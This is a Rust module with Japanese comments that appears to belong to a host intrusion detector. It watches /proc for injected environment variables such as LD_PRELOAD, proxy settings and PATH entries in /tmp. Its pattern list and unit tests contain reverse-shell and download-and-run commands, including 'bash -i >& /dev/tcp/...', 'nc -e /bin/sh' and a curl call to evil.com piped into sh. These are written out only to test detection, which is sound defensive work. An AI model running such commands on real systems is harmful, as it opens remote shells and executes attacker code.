//! プロセス環境変数スナップショット監視モジュール
//!
//! 実行中プロセスの `/proc/[pid]/environ` を定期的にスキャンし、
//! 不審な環境変数の注入をリアルタイムで検知する。
//!
//! 既存の `env_injection_monitor` が毎回フルスキャンを行うのに対し、
//! 本モジュールは前回スキャンとの差分を検知し、**新たに注入された**
//! 環境変数を重点的に検出する。
//!
//! 検知対象:
//! - `LD_PRELOAD`, `LD_LIBRARY_PATH`, `LD_AUDIT`, `LD_DEBUG` 等の動的リンカ変数
//! - `PROMPT_COMMAND` 内のリバースシェルパターン
//! - `PATH` への不審ディレクトリ（`/tmp`, `/dev/shm` 等）の追加
//! - `PYTHONPATH`, `RUBYLIB` 等のライブラリパス変数の汚染
//! - プロキシ変数（`http_proxy`, `https_proxy` 等）の不審な設定
//! - 前回スキャンから新たに注入された不審な環境変数

use crate::config::ProcEnvironMonitorConfig;
use crate::core::event::{EventBus, SecurityEvent, Severity};
use crate::error::AppError;
use crate::modules::{InitialScanResult, Module};
use std::collections::{BTreeMap, HashMap};
use std::path::Path;
use tokio_util::sync::CancellationToken;

/// 検出結果
struct Finding {
    pid: u32,
    comm: String,
    event_type: &'static str,
    severity: Severity,
    message: String,
    details: String,
}

/// `/proc/[pid]/environ` を読み取り、環境変数をパースする
fn read_proc_environ(proc_path: &Path, pid: u32) -> Option<HashMap<String, String>> {
    let path = proc_path.join(format!("{}/environ", pid));
    let data = std::fs::read(path).ok()?;
    let mut env = HashMap::new();
    for chunk in data.split(|&b| b == 0) {
        if chunk.is_empty() {
            continue;
        }
        let s = String::from_utf8_lossy(chunk);
        if let Some((key, value)) = s.split_once('=') {
            env.insert(key.to_string(), value.to_string());
        }
    }
    Some(env)
}

/// カーネルスレッドかどうかを判定する（`/proc/[pid]/cmdline` が空）
fn is_kernel_thread(proc_path: &Path, pid: u32) -> bool {
    let path = proc_path.join(format!("{}/cmdline", pid));
    match std::fs::read(&path) {
        Ok(data) => data.is_empty(),
        Err(_) => false,
    }
}

/// `/proc/[pid]/comm` からプロセス名を取得する
fn read_process_comm(proc_path: &Path, pid: u32) -> String {
    let path = proc_path.join(format!("{}/comm", pid));
    std::fs::read_to_string(path)
        .map(|s| s.trim().to_string())
        .unwrap_or_else(|_| "unknown".to_string())
}

/// `/proc/` から全 PID を列挙する
fn list_pids(proc_path: &Path) -> Vec<u32> {
    let entries = match std::fs::read_dir(proc_path) {
        Ok(e) => e,
        Err(_) => return Vec::new(),
    };
    entries
        .filter_map(|entry| {
            let entry = entry.ok()?;
            let name = entry.file_name();
            name.to_str()?.parse::<u32>().ok()
        })
        .collect()
}

/// リバースシェルパターンに該当するかチェックする
fn contains_reverse_shell_pattern(value: &str) -> bool {
    let patterns = [
        "bash -i",
        "bash%20-i",
        "/dev/tcp/",
        "/dev/udp/",
        "nc -e",
        "nc -c",
        "ncat -e",
        "ncat -c",
        "netcat -e",
        "netcat -c",
        "curl|sh",
        "curl|bash",
        "wget|sh",
        "wget|bash",
        "curl | sh",
        "curl | bash",
        "wget | sh",
        "wget | bash",
        "python -c 'import socket",
        "python3 -c 'import socket",
        "perl -e 'use Socket",
        "ruby -rsocket",
        "socat exec:",
        "exec 5<>/dev/tcp",
        "0<&196;exec 196<>/dev/tcp",
    ];
    let lower = value.to_lowercase();
    patterns.iter().any(|p| lower.contains(&p.to_lowercase()))
}

/// パスコンポーネントが不審パスリストに含まれるかを判定する
fn is_suspicious_path_dir(component: &str, suspicious_dirs: &[String]) -> bool {
    let trimmed = component.trim();
    if trimmed.is_empty() {
        return false;
    }
    for suspicious in suspicious_dirs {
        if trimmed == suspicious.as_str() || trimmed.starts_with(&format!("{}/", suspicious)) {
            return true;
        }
    }
    false
}

/// ホワイトリストパターンに一致するかチェックする
fn matches_whitelist(
    pid: u32,
    var_name: &str,
    var_value: &str,
    whitelist_patterns: &[regex::Regex],
) -> bool {
    let check_str = format!("{}:{}={}", pid, var_name, var_value);
    whitelist_patterns.iter().any(|re| re.is_match(&check_str))
}

/// 不審な環境変数をチェックする（LD_PRELOAD 等）
fn check_suspicious_vars(
    pid: u32,
    comm: &str,
    env: &HashMap<String, String>,
    config: &ProcEnvironMonitorConfig,
    whitelist: &[regex::Regex],
) -> Vec<Finding> {
    let mut findings = Vec::new();
    for var_name in &config.suspicious_vars {
        if let Some(value) = env.get(var_name.as_str()) {
            if matches_whitelist(pid, var_name, value, whitelist) {
                continue;
            }
            findings.push(Finding {
                pid,
                comm: comm.to_string(),
                event_type: "proc_environ_suspicious_var",
                severity: Severity::Critical,
                message: format!(
                    "危険な環境変数 {} がプロセス {}(PID:{}) に設定されています",
                    var_name, comm, pid
                ),
                details: format!(
                    "PID={}, プロセス名={}, 変数={}={}",
                    pid, comm, var_name, value
                ),
            });
        }
    }
    findings
}

/// PATH 内の不審ディレクトリをチェックする
fn check_path_dirs(
    pid: u32,
    comm: &str,
    env: &HashMap<String, String>,
    config: &ProcEnvironMonitorConfig,
    whitelist: &[regex::Regex],
) -> Vec<Finding> {
    let mut findings = Vec::new();
    if let Some(path_value) = env.get("PATH") {
        if matches_whitelist(pid, "PATH", path_value, whitelist) {
            return findings;
        }
        let suspicious_components: Vec<&str> = path_value
            .split(':')
            .filter(|c| is_suspicious_path_dir(c, &config.suspicious_path_dirs))
            .collect();
        if !suspicious_components.is_empty() {
            findings.push(Finding {
                pid,
                comm: comm.to_string(),
                event_type: "proc_environ_suspicious_path",
                severity: Severity::Warning,
                message: format!(
                    "PATH に不審なディレクトリが含まれています (プロセス: {}(PID:{}))",
                    comm, pid
                ),
                details: format!(
                    "PID={}, プロセス名={}, 不審パス={}",
                    pid,
                    comm,
                    suspicious_components.join(", ")
                ),
            });
        }
    }
    findings
}

/// PROMPT_COMMAND のリバースシェルパターンをチェックする
fn check_suspicious_commands(
    pid: u32,
    comm: &str,
    env: &HashMap<String, String>,
    config: &ProcEnvironMonitorConfig,
    whitelist: &[regex::Regex],
) -> Vec<Finding> {
    let mut findings = Vec::new();
    for var_name in &config.suspicious_commands {
        if let Some(value) = env.get(var_name.as_str()) {
            if matches_whitelist(pid, var_name, value, whitelist) {
                continue;
            }
            if contains_reverse_shell_pattern(value) {
                findings.push(Finding {
                    pid,
                    comm: comm.to_string(),
                    event_type: "proc_environ_suspicious_command",
                    severity: Severity::Critical,
                    message: format!(
                        "{} にリバースシェルパターンが検出されました (プロセス: {}(PID:{}))",
                        var_name, comm, pid
                    ),
                    details: format!("PID={}, プロセス名={}, {}={}", pid, comm, var_name, value),
                });
            }
        }
    }
    findings
}

/// ライブラリパス変数の不審なディレクトリをチェックする
fn check_library_paths(
    pid: u32,
    comm: &str,
    env: &HashMap<String, String>,
    config: &ProcEnvironMonitorConfig,
    whitelist: &[regex::Regex],
) -> Vec<Finding> {
    let mut findings = Vec::new();
    for var_name in &config.library_path_vars {
        if let Some(value) = env.get(var_name.as_str()) {
            if matches_whitelist(pid, var_name, value, whitelist) {
                continue;
            }
            let suspicious: Vec<&str> = value
                .split(&[':', ';'][..])
                .filter(|c| is_suspicious_path_dir(c, &config.suspicious_path_dirs))
                .collect();
            if !suspicious.is_empty() {
                findings.push(Finding {
                    pid,
                    comm: comm.to_string(),
                    event_type: "proc_environ_library_path_injection",
                    severity: Severity::Warning,
                    message: format!(
                        "{} に不審なパスが含まれています (プロセス: {}(PID:{}))",
                        var_name, comm, pid
                    ),
                    details: format!(
                        "PID={}, プロセス名={}, {}={}, 不審パス={}",
                        pid,
                        comm,
                        var_name,
                        value,
                        suspicious.join(", ")
                    ),
                });
            }
        }
    }
    findings
}

/// プロキシ変数のチェック
fn check_proxy_vars(
    pid: u32,
    comm: &str,
    env: &HashMap<String, String>,
    config: &ProcEnvironMonitorConfig,
    whitelist: &[regex::Regex],
) -> Vec<Finding> {
    let mut findings = Vec::new();
    for var_name in &config.proxy_vars {
        if let Some(value) = env.get(var_name.as_str()) {
            if matches_whitelist(pid, var_name, value, whitelist) {
                continue;
            }
            findings.push(Finding {
                pid,
                comm: comm.to_string(),
                event_type: "proc_environ_suspicious_proxy",
                severity: Severity::Warning,
                message: format!(
                    "プロキシ変数 {} がプロセス {}(PID:{}) に設定されています",
                    var_name, comm, pid
                ),
                details: format!("PID={}, プロセス名={}, {}={}", pid, comm, var_name, value),
            });
        }
    }
    findings
}

/// 全プロセスの環境変数スナップショットを取得する
fn take_snapshot(
    proc_path: &Path,
    skip_kernel_threads: bool,
) -> HashMap<u32, HashMap<String, String>> {
    let pids = list_pids(proc_path);
    let mut snapshot = HashMap::new();

    // 自プロセスの PID をスキップ
    let self_pid = std::process::id();

    for pid in pids {
        if pid == self_pid {
            continue;
        }
        if skip_kernel_threads && is_kernel_thread(proc_path, pid) {
            continue;
        }
        if let Some(env) = read_proc_environ(proc_path, pid) {
            snapshot.insert(pid, env);
        }
    }
    snapshot
}

/// 前回スキャンとの差分で新たに注入された不審な変数を検知する
fn detect_new_injections(
    prev: &HashMap<u32, HashMap<String, String>>,
    current: &HashMap<u32, HashMap<String, String>>,
    proc_path: &Path,
    config: &ProcEnvironMonitorConfig,
    whitelist: &[regex::Regex],
    event_bus: &Option<EventBus>,
) -> usize {
    let mut injection_count = 0;

    let suspicious_all: Vec<&str> = config
        .suspicious_vars
        .iter()
        .chain(config.suspicious_commands.iter())
        .chain(config.library_path_vars.iter())
        .chain(config.proxy_vars.iter())
        .map(|s| s.as_str())
        .collect();

    for (pid, current_env) in current {
        if let Some(prev_env) = prev.get(pid) {
            // 既存プロセス: 前回になかった不審な変数が追加されたか
            for var_name in &suspicious_all {
                if current_env.contains_key(*var_name) && !prev_env.contains_key(*var_name) {
                    let value = &current_env[*var_name];
                    if matches_whitelist(*pid, var_name, value, whitelist) {
                        continue;
                    }
                    let comm = read_process_comm(proc_path, *pid);
                    let details = format!(
                        "PID={}, プロセス名={}, 新規注入変数={}={}",
                        pid, comm, var_name, value
                    );
                    tracing::warn!(
                        pid = pid,
                        comm = %comm,
                        variable = %var_name,
                        "プロセスに新たな不審な環境変数が注入されました"
                    );
                    if let Some(bus) = event_bus {
                        bus.publish(
                            SecurityEvent::new(
                                "proc_environ_new_injection",
                                Severity::Critical,
                                "proc_environ_monitor",
                                "プロセスに新たな不審な環境変数が注入されました",
                            )
                            .with_details(details),
                        );
                    }
                    injection_count += 1;
                }
            }
        }
    }

    injection_count
}

/// プロセス環境変数スナップショット監視モジュール
///
/// 実行中プロセスの `/proc/[pid]/environ` を定期スキャンし、
/// 不審な環境変数の注入をリアルタイムで検知する。
pub struct ProcEnvironMonitorModule {
    config: ProcEnvironMonitorConfig,
    cancel_token: CancellationToken,
    event_bus: Option<EventBus>,
}

impl ProcEnvironMonitorModule {
    /// 新しいプロセス環境変数スナップショット監視モジュールを作成する
    pub fn new(config: ProcEnvironMonitorConfig, event_bus: Option<EventBus>) -> Self {
        Self {
            config,
            cancel_token: CancellationToken::new(),
            event_bus,
        }
    }

    /// キャンセルトークンのクローンを返す
    pub fn cancel_token(&self) -> CancellationToken {
        self.cancel_token.clone()
    }

    /// ホワイトリストパターンをコンパイルする
    fn compile_whitelist(patterns: &[String]) -> Vec<regex::Regex> {
        patterns
            .iter()
            .filter_map(|p| match regex::Regex::new(p) {
                Ok(re) => Some(re),
                Err(e) => {
                    tracing::warn!(
                        pattern = %p,
                        error = %e,
                        "ホワイトリストパターンのコンパイルに失敗しました"
                    );
                    None
                }
            })
            .collect()
    }

    /// 全プロセスをスキャンし、不審な環境変数を検出する
    fn scan_processes(
        proc_path: &Path,
        snapshot: &HashMap<u32, HashMap<String, String>>,
        config: &ProcEnvironMonitorConfig,
        whitelist: &[regex::Regex],
    ) -> Vec<Finding> {
        let mut findings = Vec::new();

        for (pid, env) in snapshot {
            let comm = read_process_comm(proc_path, *pid);

            findings.extend(check_suspicious_vars(*pid, &comm, env, config, whitelist));
            findings.extend(check_path_dirs(*pid, &comm, env, config, whitelist));
            findings.extend(check_suspicious_commands(
                *pid, &comm, env, config, whitelist,
            ));
            findings.extend(check_library_paths(*pid, &comm, env, config, whitelist));
            findings.extend(check_proxy_vars(*pid, &comm, env, config, whitelist));
        }

        findings
    }

    /// 検出結果をイベントバスに発行する
    fn publish_findings(findings: &[Finding], event_bus: &Option<EventBus>) {
        let Some(bus) = event_bus else {
            return;
        };
        for f in findings {
            match f.severity {
                Severity::Critical => {
                    tracing::warn!(
                        pid = f.pid,
                        comm = %f.comm,
                        event_type = f.event_type,
                        "{}",
                        f.message
                    );
                }
                _ => {
                    tracing::info!(
                        pid = f.pid,
                        comm = %f.comm,
                        event_type = f.event_type,
                        "{}",
                        f.message
                    );
                }
            }
            bus.publish(
                SecurityEvent::new(
                    f.event_type,
                    f.severity.clone(),
                    "proc_environ_monitor",
                    &f.message,
                )
                .with_details(f.details.clone()),
            );
        }
    }
}

impl Module for ProcEnvironMonitorModule {
    fn name(&self) -> &str {
        "proc_environ_monitor"
    }

    fn init(&mut self) -> Result<(), AppError> {
        if self.config.scan_interval_secs == 0 {
            return Err(AppError::ModuleConfig {
                message: "scan_interval_secs は 0 より大きい値を指定してください".to_string(),
            });
        }

        // ホワイトリストパターンの妥当性を検証
        for pattern in &self.config.whitelist_patterns {
            if regex::Regex::new(pattern).is_err() {
                return Err(AppError::ModuleConfig {
                    message: format!(
                        "whitelist_patterns に無効な正規表現が含まれています: {}",
                        pattern
                    ),
                });
            }
        }

        tracing::info!(
            scan_interval_secs = self.config.scan_interval_secs,
            suspicious_vars = ?self.config.suspicious_vars,
            suspicious_path_dirs = ?self.config.suspicious_path_dirs,
            whitelist_patterns_count = self.config.whitelist_patterns.len(),
            skip_kernel_threads = self.config.skip_kernel_threads,
            "プロセス環境変数スナップショット監視モジュールを初期化しました"
        );

        Ok(())
    }

    async fn start(&mut self) -> Result<(), AppError> {
        let whitelist = Self::compile_whitelist(&self.config.whitelist_patterns);

        // ベースラインスナップショットの取得
        let baseline = take_snapshot(Path::new("/proc"), self.config.skip_kernel_threads);
        tracing::info!(
            process_count = baseline.len(),
            "プロセス環境変数ベースラインスキャンが完了しました"
        );

        // 初回スキャン結果の発行
        let initial_findings =
            Self::scan_processes(Path::new("/proc"), &baseline, &self.config, &whitelist);
        Self::publish_findings(&initial_findings, &self.event_bus);

        let config = self.config.clone();
        let cancel_token = self.cancel_token.clone();
        let event_bus = self.event_bus.clone();

        tokio::spawn(async move {
            let mut interval =
                tokio::time::interval(std::time::Duration::from_secs(config.scan_interval_secs));
            interval.tick().await;

            let mut prev_snapshot = baseline;

            loop {
                tokio::select! {
                    _ = cancel_token.cancelled() => {
                        tracing::info!("プロセス環境変数スナップショット監視モジュールを停止します");
                        break;
                    }
                    _ = interval.tick() => {
                        let current = take_snapshot(
                            Path::new("/proc"),
                            config.skip_kernel_threads,
                        );

                        // 通常のスキャン
                        let findings = ProcEnvironMonitorModule::scan_processes(
                            Path::new("/proc"),
                            &current,
                            &config,
                            &whitelist,
                        );
                        ProcEnvironMonitorModule::publish_findings(&findings, &event_bus);

                        // 差分検知（新規注入）
                        let injections = detect_new_injections(
                            &prev_snapshot,
                            &current,
                            Path::new("/proc"),
                            &config,
                            &whitelist,
                            &event_bus,
                        );

                        if injections > 0 {
                            tracing::warn!(
                                injections = injections,
                                "新たな環境変数注入を検知しました"
                            );
                        }

                        // 大量検知の異常アラート
                        let total = findings.len() + injections;
                        if total > 50 {
                            tracing::warn!(
                                total = total,
                                "プロセス環境変数の大量異常を検知しました"
                            );
                            if let Some(bus) = &event_bus {
                                bus.publish(
                                    SecurityEvent::new(
                                        "proc_environ_scan_anomaly",
                                        Severity::Critical,
                                        "proc_environ_monitor",
                                        "プロセス環境変数の大量異常を検知しました（攻撃の可能性）",
                                    )
                                    .with_details(format!("異常件数={}", total)),
                                );
                            }
                        }

                        prev_snapshot = current;
                    }
                }
            }
        });

        Ok(())
    }

    async fn initial_scan(&self) -> Result<InitialScanResult, AppError> {
        let start = std::time::Instant::now();
        let whitelist = Self::compile_whitelist(&self.config.whitelist_patterns);

        let snapshot = take_snapshot(Path::new("/proc"), self.config.skip_kernel_threads);
        let items_scanned = snapshot.len();

        let findings =
            Self::scan_processes(Path::new("/proc"), &snapshot, &self.config, &whitelist);
        let issues_found = findings.len();

        // 起動時スキャン結果は Info レベルで発行
        for f in &findings {
            tracing::info!(
                pid = f.pid,
                comm = %f.comm,
                event_type = f.event_type,
                "起動時スキャン: {}",
                f.message
            );
            if let Some(bus) = &self.event_bus {
                bus.publish(
                    SecurityEvent::new(
                        f.event_type,
                        Severity::Info,
                        "proc_environ_monitor",
                        format!("起動時スキャン: {}", f.message),
                    )
                    .with_details(f.details.clone()),
                );
            }
        }

        let mut scan_snapshot = BTreeMap::new();
        scan_snapshot.insert("process_count".to_string(), items_scanned.to_string());
        scan_snapshot.insert("issues_found".to_string(), issues_found.to_string());

        let duration = start.elapsed();

        Ok(InitialScanResult {
            items_scanned,
            issues_found,
            duration,
            summary: format!(
                "プロセス {}件の環境変数をスキャン、不審な設定 {}件を検出",
                items_scanned, issues_found
            ),
            snapshot: scan_snapshot,
        })
    }

    async fn stop(&mut self) -> Result<(), AppError> {
        self.cancel_token.cancel();
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn default_config() -> ProcEnvironMonitorConfig {
        ProcEnvironMonitorConfig {
            enabled: true,
            scan_interval_secs: 60,
            suspicious_vars: vec![
                "LD_PRELOAD".to_string(),
                "LD_LIBRARY_PATH".to_string(),
                "LD_AUDIT".to_string(),
                "LD_DEBUG".to_string(),
                "LD_PROFILE".to_string(),
            ],
            suspicious_path_dirs: vec![
                "/tmp".to_string(),
                "/dev/shm".to_string(),
                "/var/tmp".to_string(),
                "/run/shm".to_string(),
            ],
            suspicious_commands: vec!["PROMPT_COMMAND".to_string()],
            library_path_vars: vec![
                "PYTHONPATH".to_string(),
                "RUBYLIB".to_string(),
                "PERL5LIB".to_string(),
                "NODE_PATH".to_string(),
                "CLASSPATH".to_string(),
            ],
            proxy_vars: vec![
                "http_proxy".to_string(),
                "https_proxy".to_string(),
                "HTTP_PROXY".to_string(),
                "HTTPS_PROXY".to_string(),
            ],
            whitelist_patterns: vec![],
            skip_kernel_threads: true,
        }
    }

    #[test]
    fn test_list_pids() {
        let pids = list_pids(Path::new("/proc"));
        if cfg!(target_os = "linux") {
            assert!(!pids.is_empty());
            assert!(pids.contains(&1));
        }
    }

    #[test]
    fn test_list_pids_nonexistent() {
        let pids = list_pids(Path::new("/nonexistent"));
        assert!(pids.is_empty());
    }

    #[test]
    fn test_read_proc_environ_self() {
        if cfg!(target_os = "linux") {
            let pid = std::process::id();
            let env = read_proc_environ(Path::new("/proc"), pid);
            assert!(env.is_some());
            let env = env.unwrap();
            assert!(env.contains_key("PATH"));
        }
    }

    #[test]
    fn test_read_proc_environ_nonexistent() {
        let env = read_proc_environ(Path::new("/proc"), 999_999_999);
        assert!(env.is_none());
    }

    #[test]
    fn test_is_kernel_thread() {
        if cfg!(target_os = "linux") {
            // PID 1 はカーネルスレッドではない
            assert!(!is_kernel_thread(Path::new("/proc"), 1));
        }
    }

    #[test]
    fn test_read_process_comm() {
        if cfg!(target_os = "linux") {
            let comm = read_process_comm(Path::new("/proc"), 1);
            assert!(!comm.is_empty());
            assert_ne!(comm, "unknown");
        }
    }

    #[test]
    fn test_read_process_comm_nonexistent() {
        let comm = read_process_comm(Path::new("/proc"), 999_999_999);
        assert_eq!(comm, "unknown");
    }

    #[test]
    fn test_contains_reverse_shell_pattern() {
        assert!(contains_reverse_shell_pattern(
            "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1"
        ));
        assert!(contains_reverse_shell_pattern(
            "nc -e /bin/sh 10.0.0.1 4242"
        ));
        assert!(contains_reverse_shell_pattern(
            "$(curl http://evil.com/s.sh)|sh; curl|sh"
        ));
        assert!(contains_reverse_shell_pattern(
            "python -c 'import socket,subprocess,os"
        ));
        assert!(!contains_reverse_shell_pattern("echo hello"));
        assert!(!contains_reverse_shell_pattern("/usr/bin/normal_command"));
    }

    #[test]
    fn test_is_suspicious_path_dir() {
        let suspicious = vec![
            "/tmp".to_string(),
            "/dev/shm".to_string(),
            "/var/tmp".to_string(),
        ];

        assert!(is_suspicious_path_dir("/tmp", &suspicious));
        assert!(is_suspicious_path_dir("/tmp/evil", &suspicious));
        assert!(is_suspicious_path_dir("/dev/shm", &suspicious));
        assert!(!is_suspicious_path_dir("/usr/bin", &suspicious));
        assert!(!is_suspicious_path_dir("/usr/local/bin", &suspicious));
        assert!(!is_suspicious_path_dir("", &suspicious));
    }

    #[test]
    fn test_check_suspicious_vars_ld_preload() {
        let config = default_config();
        let mut env = HashMap::new();
        env.insert("LD_PRELOAD".to_string(), "/tmp/evil.so".to_string());

        let findings = check_suspicious_vars(42, "test_proc", &env, &config, &[]);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].event_type, "proc_environ_suspicious_var");
        assert_eq!(findings[0].severity, Severity::Critical);
    }

    #[test]
    fn test_check_suspicious_vars_none() {
        let config = default_config();
        let mut env = HashMap::new();
        env.insert("PATH".to_string(), "/usr/bin".to_string());

        let findings = check_suspicious_vars(42, "test_proc", &env, &config, &[]);
        assert!(findings.is_empty());
    }

    #[test]
    fn test_check_path_dirs_suspicious() {
        let config = default_config();
        let mut env = HashMap::new();
        env.insert(
            "PATH".to_string(),
            "/usr/bin:/tmp:/usr/local/bin".to_string(),
        );

        let findings = check_path_dirs(42, "test_proc", &env, &config, &[]);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].event_type, "proc_environ_suspicious_path");
        assert_eq!(findings[0].severity, Severity::Warning);
    }

    #[test]
    fn test_check_path_dirs_clean() {
        let config = default_config();
        let mut env = HashMap::new();
        env.insert("PATH".to_string(), "/usr/bin:/usr/local/bin".to_string());

        let findings = check_path_dirs(42, "test_proc", &env, &config, &[]);
        assert!(findings.is_empty());
    }

    #[test]
    fn test_check_suspicious_commands_reverse_shell() {
        let config = default_config();
        let mut env = HashMap::new();
        env.insert(
            "PROMPT_COMMAND".to_string(),
            "bash -i >& /dev/tcp/10.0.0.1/4242 0>&1".to_string(),
        );

        let findings = check_suspicious_commands(42, "bash", &env, &config, &[]);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].event_type, "proc_environ_suspicious_command");
        assert_eq!(findings[0].severity, Severity::Critical);
    }

    #[test]
    fn test_check_suspicious_commands_normal() {
        let config = default_config();
        let mut env = HashMap::new();
        env.insert(
            "PROMPT_COMMAND".to_string(),
            "history -a; history -n".to_string(),
        );

        let findings = check_suspicious_commands(42, "bash", &env, &config, &[]);
        assert!(findings.is_empty());
    }

    #[test]
    fn test_check_library_paths_suspicious() {
        let config = default_config();
        let mut env = HashMap::new();
        env.insert(
            "PYTHONPATH".to_string(),
            "/usr/lib/python:/tmp/evil".to_string(),
        );

        let findings = check_library_paths(42, "python3", &env, &config, &[]);
        assert_eq!(findings.len(), 1);
        assert_eq!(
            findings[0].event_type,
            "proc_environ_library_path_injection"
        );
        assert_eq!(findings[0].severity, Severity::Warning);
    }

    #[test]
    fn test_check_library_paths_clean() {
        let config = default_config();
        let mut env = HashMap::new();
        env.insert(
            "PYTHONPATH".to_string(),
            "/usr/lib/python3:/usr/local/lib/python3".to_string(),
        );

        let findings = check_library_paths(42, "python3", &env, &config, &[]);
        assert!(findings.is_empty());
    }

    #[test]
    fn test_check_proxy_vars() {
        let config = default_config();
        let mut env = HashMap::new();
        env.insert(
            "http_proxy".to_string(),
            "http://evil.proxy:8080".to_string(),
        );

        let findings = check_proxy_vars(42, "curl", &env, &config, &[]);
        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].event_type, "proc_environ_suspicious_proxy");
        assert_eq!(findings[0].severity, Severity::Warning);
    }

    #[test]
    fn test_check_proxy_vars_no_proxy() {
        let config = default_config();
        let env = HashMap::new();

        let findings = check_proxy_vars(42, "curl", &env, &config, &[]);
        assert!(findings.is_empty());
    }

    #[test]
    fn test_whitelist_matching() {
        // unwrap safety: テスト用の固定パターン
        let whitelist = vec![regex::Regex::new(r".*:LD_PRELOAD=/usr/lib/safe\.so").unwrap()];

        assert!(matches_whitelist(
            42,
            "LD_PRELOAD",
            "/usr/lib/safe.so",
            &whitelist
        ));
        assert!(!matches_whitelist(
            42,
            "LD_PRELOAD",
            "/tmp/evil.so",
            &whitelist
        ));
    }

    #[test]
    fn test_take_snapshot() {
        let snapshot = take_snapshot(Path::new("/proc"), true);
        if cfg!(target_os = "linux") {
            assert!(!snapshot.is_empty());
        }
    }

    #[test]
    fn test_take_snapshot_nonexistent() {
        let snapshot = take_snapshot(Path::new("/nonexistent"), true);
        assert!(snapshot.is_empty());
    }

    #[test]
    fn test_detect_new_injections_no_change() {
        let mut env = HashMap::new();
        env.insert("PATH".to_string(), "/usr/bin".to_string());
        let snapshot = HashMap::from([(42, env)]);

        let count = detect_new_injections(
            &snapshot,
            &snapshot,
            Path::new("/proc"),
            &default_config(),
            &[],
            &None,
        );
        assert_eq!(count, 0);
    }

    #[test]
    fn test_detect_new_injections_new_var() {
        let config = default_config();
        let mut env_prev = HashMap::new();
        env_prev.insert("PATH".to_string(), "/usr/bin".to_string());
        let prev = HashMap::from([(42, env_prev)]);

        let mut env_current = HashMap::new();
        env_current.insert("PATH".to_string(), "/usr/bin".to_string());
        env_current.insert("LD_PRELOAD".to_string(), "/tmp/evil.so".to_string());
        let current = HashMap::from([(42, env_current)]);

        let count = detect_new_injections(&prev, &current, Path::new("/proc"), &config, &[], &None);
        assert_eq!(count, 1);
    }

    #[test]
    fn test_detect_new_injections_whitelisted() {
        let config = default_config();
        // unwrap safety: テスト用の固定パターン
        let whitelist = vec![regex::Regex::new(r".*:LD_PRELOAD=.*").unwrap()];

        let mut env_prev = HashMap::new();
        env_prev.insert("PATH".to_string(), "/usr/bin".to_string());
        let prev = HashMap::from([(42, env_prev)]);

        let mut env_current = HashMap::new();
        env_current.insert("PATH".to_string(), "/usr/bin".to_string());
        env_current.insert("LD_PRELOAD".to_string(), "/tmp/evil.so".to_string());
        let current = HashMap::from([(42, env_current)]);

        let count = detect_new_injections(
            &prev,
            &current,
            Path::new("/proc"),
            &config,
            &whitelist,
            &None,
        );
        assert_eq!(count, 0);
    }

    #[test]
    fn test_init_zero_interval() {
        let mut config = default_config();
        config.scan_interval_secs = 0;
        let mut module = ProcEnvironMonitorModule::new(config, None);
        assert!(module.init().is_err());
    }

    #[test]
    fn test_init_invalid_whitelist() {
        let mut config = default_config();
        config.whitelist_patterns = vec!["[invalid".to_string()];
        let mut module = ProcEnvironMonitorModule::new(config, None);
        assert!(module.init().is_err());
    }

    #[test]
    fn test_init_valid() {
        let mut module = ProcEnvironMonitorModule::new(default_config(), None);
        assert!(module.init().is_ok());
    }

    #[tokio::test]
    async fn test_start_and_stop() {
        let mut config = default_config();
        config.scan_interval_secs = 3600;
        let mut module = ProcEnvironMonitorModule::new(config, None);
        module.init().unwrap();

        let cancel_token = module.cancel_token();
        module.start().await.unwrap();

        module.stop().await.unwrap();
        assert!(cancel_token.is_cancelled());
    }

    #[tokio::test]
    async fn test_initial_scan() {
        let module = ProcEnvironMonitorModule::new(default_config(), None);

        let result = module.initial_scan().await.unwrap();
        assert!(result.summary.contains("プロセス"));
        if cfg!(target_os = "linux") {
            assert!(result.items_scanned > 0);
        }
    }

    #[test]
    fn test_scan_processes() {
        let config = default_config();
        let snapshot = take_snapshot(Path::new("/proc"), true);
        let findings =
            ProcEnvironMonitorModule::scan_processes(Path::new("/proc"), &snapshot, &config, &[]);
        // 結果の正確な数はシステム依存だが、パニックしないことを確認
        let _ = findings;
    }

    #[test]
    fn test_compile_whitelist_valid() {
        let patterns = vec!["^test$".to_string(), "foo.*bar".to_string()];
        let compiled = ProcEnvironMonitorModule::compile_whitelist(&patterns);
        assert_eq!(compiled.len(), 2);
    }

    #[test]
    fn test_compile_whitelist_invalid() {
        let patterns = vec!["[invalid".to_string(), "^valid$".to_string()];
        let compiled = ProcEnvironMonitorModule::compile_whitelist(&patterns);
        assert_eq!(compiled.len(), 1); // invalid はスキップされる
    }
}
